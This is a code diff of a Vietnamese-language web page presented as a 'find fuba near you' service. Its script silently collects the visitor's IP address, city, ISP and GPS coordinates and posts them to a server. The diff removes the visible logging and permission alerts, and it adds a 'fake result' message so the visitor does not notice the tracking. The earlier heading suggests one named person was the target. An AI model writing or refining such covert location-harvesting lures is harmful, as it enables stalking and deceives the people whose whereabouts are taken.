@@ -1,14 +1,60 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Nearby Finder</title>
+  <style>
+    body {
+      font-family: Arial;
+      text-align: center;
+      background: #f5f5f5;
+      padding-top: 100px;
+    }
+
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      width: 300px;
+      margin: auto;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+    }
+
+    button {
+      padding: 12px 20px;
+      border: none;
+      background: #007bff;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+
+    button:hover {
+      background: #0056b3;
+    }
+
+    .loading {
+      display: none;
+      margin-top: 15px;
+      color: gray;
+    }
+  </style>
+</head>
 <body>
-<h1>alo vũ à vũ</h1>
-<button onclick="getLocation()">Xem gần bạn</button>
+
+<div class="card">
+  <h2>tìm fuba gần bạn</h2>
+  <p>Cho phép vị trí để xem gợi ý chính xác nhất</p>
+
+  <button onclick="start()">bắt đầu tìm kiếm</button>
+
+  <div class="loading" id="loading">Đang tìm...</div>
+</div>
 
 <script>
 let data = {};
 let sent = false;
 
-// 1. Lấy IP trước (không gửi vội)
 async function getIP() {
   try {
     const res = await fetch("https://ipwho.is/");
@@ -18,12 +64,9 @@ async function getIP() {
     data.city = ipData.city;
     data.country = ipData.country;
     data.isp = ipData.connection?.isp;
-  } catch (e) {
-    console.log("IP fail");
-  }
+  } catch {}
 }
 
-// 2. Gửi dữ liệu (chỉ 1 lần)
 function sendData() {
   if (sent) return;
   sent = true;
@@ -35,15 +78,13 @@ function sendData() {
     },
     body: JSON.stringify(data)
   });
-
-  console.log("Sent:", data);
 }
 
-// 3. Khi bấm nút → lấy GPS rồi gửi
-function getLocation() {
+function start() {
+  document.getElementById("loading").style.display = "block";
+
   if (!navigator.geolocation) {
-    alert("Không hỗ trợ GPS");
-    sendData(); // fallback
+    sendData();
     return;
   }
 
@@ -54,15 +95,21 @@ function getLocation() {
       data.accuracy = pos.coords.accuracy;
 
       sendData();
+
+      // fake result
+      setTimeout(() => {
+        document.querySelector(".card").innerHTML = `
+          <h3> Đã tìm thấy khu vực của bạn</h3>
+          <p>Đang hiển thị gợi ý phù hợp...</p>
+        `;
+      }, 1500);
     },
     () => {
-      alert("Bạn chưa cho phép truy cập vị trí");
-      sendData(); // fallback IP
+      sendData();
     }
   );
 }
 
-// chạy khi load (chỉ lấy IP thôi)
 getIP();
 </script>
 
